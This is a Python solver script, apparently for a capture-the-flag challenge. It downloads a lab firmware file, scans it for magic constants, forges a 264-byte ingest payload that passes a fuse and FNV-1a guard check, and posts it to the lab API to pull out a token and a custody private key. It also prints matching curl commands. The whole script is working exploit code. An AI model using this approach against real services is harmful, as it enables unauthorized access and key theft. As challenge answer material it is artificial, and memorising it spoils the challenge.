#!/usr/bin/env python3
"""
uis_token3_firmware_re.py

What it does:
1. Downloads libboot.so from the public firmware endpoint.
2. Performs lightweight player-style static triage:
   - scans strings for AUTH_UNSEALED / constants
   - scans the binary bytes for magic constants
   - explains why these imply a crafted payload is possible
3. Builds a valid 264-byte ingest payload:
   - first 256 bytes are controlled
   - bytes 256..259 are the little-endian fuse value 0x0BADC0DE
   - bytes 260..263 are the little-endian guard value
     fnv1a32(first_64_bytes) ^ 0xA5C3F1D7
4. Submits the payload to /api/v1/ingest
5. Extracts AUTHWRAP and custody key material
6. Base64-decodes AUTHWRAP to recover TOKEN3
7. Prints equivalent curl commands that a player could run manually

Usage:
    python3 uis_token3_firmware_re.py
    python3 uis_token3_firmware_re.py --base-url http://eld.local:8080 --verbose
    python3 uis_token3_firmware_re.py --quiet

Notes:
- This solver assumes Token 2 has already unlocked maintenance mode / ingest access.
"""

from __future__ import annotations

import argparse
import base64
import json
import struct
import sys
from pathlib import Path

import requests


DEFAULT_BASE = "http://eld.local:8080"
FIRMWARE_PATH = "/firmware/libboot.so"
INGEST_PATH = "/api/v1/ingest"


def fnv1a32(buf: bytes) -> int:
    h = 0x811C9DC5
    for b in buf:
        h ^= b
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h


def p(msg: str, quiet: bool = False) -> None:
    if not quiet:
        print(msg)


def hexdword(x: int) -> str:
    return f"0x{x:08X}"


def curl_json(url: str, payload: dict) -> str:
    body = json.dumps(payload, separators=(",", ":"))
    return (
        f"curl -s -X POST {url} "
        f"-H 'Content-Type: application/json' "
        f"-d '{body}'"
    )


def download_firmware(base_url: str, outdir: Path, quiet: bool) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    url = base_url.rstrip("/") + FIRMWARE_PATH
    dst = outdir / "libboot.so"

    p("[1] Downloading public firmware snapshot", quiet)
    p(f"    GET {url}", quiet)
    p(f"    curl -s -o {dst.name} {url}", quiet)

    r = requests.get(url, timeout=20)
    r.raise_for_status()
    dst.write_bytes(r.content)

    p(f"    saved {dst} ({len(r.content)} bytes)", quiet)
    return dst


def triage_firmware(path: Path, quiet: bool) -> dict:
    data = path.read_bytes()

    findings = {
        "has_auth_unsealed": b"AUTH_UNSEALED" in data,
        "has_authwrap": b"AUTHWRAP" in data,
        "has_badc0de": struct.pack("<I", 0x0BADC0DE) in data,
        "has_a5c3f1d7": struct.pack("<I", 0xA5C3F1D7) in data,
        "has_fnv_prime": struct.pack("<I", 0x01000193) in data,
        "has_fnv_offset": struct.pack("<I", 0x811C9DC5) in data,
    }

    printable = []
    cur = bytearray()
    for b in data:
        if 32 <= b <= 126:
            cur.append(b)
        else:
            if len(cur) >= 4:
                printable.append(cur.decode("ascii", errors="ignore"))
            cur = bytearray()
    if len(cur) >= 4:
        printable.append(cur.decode("ascii", errors="ignore"))

    interesting = [
        s for s in printable
        if ("AUTH" in s) or ("INGEST" in s) or ("boot" in s.lower())
    ][:20]

    p("[2] Lightweight player-style firmware triage", quiet)
    p("    Equivalent manual commands a player might try:", quiet)
    p("    strings -a libboot.so | grep -E 'AUTH|INGEST|boot'", quiet)
    p("    r2 -A libboot.so", quiet)
    p("    iz~AUTH", quiet)
    p("    /x dec0ad0b", quiet)
    p("    /x d7f1c3a5", quiet)
    p("", quiet)

    if interesting:
        p("    Interesting strings:", quiet)
        for s in interesting[:10]:
            p(f"      - {s}", quiet)
    else:
        p("    No especially helpful printable strings were found.", quiet)

    p("", quiet)
    p("    Binary constant scan:", quiet)
    p(f"      AUTH_UNSEALED present: {findings['has_auth_unsealed']}", quiet)
    p(f"      AUTHWRAP present:      {findings['has_authwrap']}", quiet)
    p(f"      0x0BADC0DE present:    {findings['has_badc0de']}", quiet)
    p(f"      0xA5C3F1D7 present:    {findings['has_a5c3f1d7']}", quiet)
    p(f"      FNV prime present:     {findings['has_fnv_prime']}", quiet)
    p(f"      FNV offset present:    {findings['has_fnv_offset']}", quiet)

    p("", quiet)
    p("    Interpretation:", quiet)
    p("      - AUTH_UNSEALED suggests a guarded success path in firmware.", quiet)
    p("      - 0x0BADC0DE looks like a required magic value.", quiet)
    p("      - 0xA5C3F1D7 plus FNV constants suggests a derived guard check.", quiet)
    p("      - The intended exploit path is to satisfy the release condition,", quiet)
    p("        then submit the crafted bytes to /api/v1/ingest.", quiet)

    return findings


def build_payload(quiet: bool) -> tuple[bytes, int, int]:
    p("[3] Building a valid crafted ingest frame", quiet)

    first64 = (
        b"PLAYER-PREFIX:"
        b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    )
    first64 = first64[:64].ljust(64, b"A")

    buf256 = first64 + (b"\x00" * (256 - 64))
    fuse = 0x0BADC0DE
    guard = fnv1a32(buf256[:64]) ^ 0xA5C3F1D7

    payload = buf256 + struct.pack("<I", fuse) + struct.pack("<I", guard)
    if len(payload) != 264:
        raise RuntimeError(f"payload length bug: got {len(payload)} bytes, expected 264")

    p(f"    first 64 bytes chosen by solver: {first64!r}", quiet)
    p(f"    computed FNV1a32(first64): {hexdword(fnv1a32(buf256[:64]))}", quiet)
    p(f"    required fuse value:       {hexdword(fuse)}", quiet)
    p(f"    derived guard value:       {hexdword(guard)}", quiet)
    p("    layout:", quiet)
    p("      bytes 0..255   = controlled buffer", quiet)
    p("      bytes 256..259 = little-endian fuse", quiet)
    p("      bytes 260..263 = little-endian guard", quiet)

    return payload, fuse, guard


def submit_ingest(base_url: str, payload: bytes, quiet: bool) -> dict:
    url = base_url.rstrip("/") + INGEST_PATH
    payload_b64 = base64.b64encode(payload).decode()

    body = {"payload_b64": payload_b64}

    p("[4] Submitting crafted payload to the public ingest API", quiet)
    p(f"    POST {url}", quiet)
    p("    Equivalent curl:", quiet)
    p(f"    {curl_json(url, body)}", quiet)

    r = requests.post(url, json=body, timeout=20)
    p(f"    HTTP {r.status_code}", quiet)

    try:
        j = r.json()
    except Exception:
        raise RuntimeError(f"non-JSON response from ingest: {r.text[:500]!r}")

    if r.status_code >= 400:
        raise RuntimeError(f"ingest rejected payload: {json.dumps(j, indent=2)}")

    return j


def extract_token3(resp: dict, quiet: bool) -> str:
    p("[5] Parsing ingest response", quiet)
    authwrap = None
    custody_key = None

    for k, v in resp.items():
        ku = k.upper()
        if ku == "AUTHWRAP":
            authwrap = v
        if ku == "CUSTODY_PRIVKEY_B64":
            custody_key = v

    if not authwrap:
        # Try more forgiving lookup
        for k, v in resp.items():
            if "auth" in k.lower() and "wrap" in k.lower():
                authwrap = v
            if "custody" in k.lower() and "b64" in k.lower():
                custody_key = v

    if not authwrap:
        raise RuntimeError(f"response did not include AUTHWRAP: {json.dumps(resp, indent=2)}")

    p(f"    AUTHWRAP present: yes ({len(authwrap)} chars)", quiet)
    p(f"    CUSTODY_PRIVKEY_B64 present: {'yes' if custody_key else 'no'}", quiet)

    p("[6] Decoding AUTHWRAP to recover TOKEN3", quiet)
    p("    Equivalent manual command:", quiet)
    p(f"    echo '{authwrap}' | base64 -d", quiet)

    try:
        token3 = base64.b64decode(authwrap).decode()
    except Exception as e:
        raise RuntimeError(f"failed to base64-decode AUTHWRAP: {e}")

    if custody_key and not quiet:
        print("\n[+] CUSTODY_PRIVKEY_B64")
        print(custody_key)

    return token3


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default=DEFAULT_BASE, help="ELD base URL")
    parser.add_argument("--workdir", default=".", help="working directory")
    parser.add_argument("--verbose", action="store_true", help="show full solver trace")
    parser.add_argument("--quiet", action="store_true", help="print only TOKEN3")
    args = parser.parse_args()

    quiet = args.quiet and not args.verbose
    workdir = Path(args.workdir)

    try:
        fw = download_firmware(args.base_url, workdir, quiet)
        triage_firmware(fw, quiet)
        payload, fuse, guard = build_payload(quiet)
        resp = submit_ingest(args.base_url, payload, quiet)
        token3 = extract_token3(resp, quiet)
    except Exception as e:
        print(f"[!] Solver failed: {e}", file=sys.stderr)
        return 1

    if quiet:
        print(token3)
        return 0

    print("\n[7] Final result")
    print(f"    fuse used:  {hexdword(fuse)}")
    print(f"    guard used: {hexdword(guard)}")
    print(f"    TOKEN3:     {token3}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())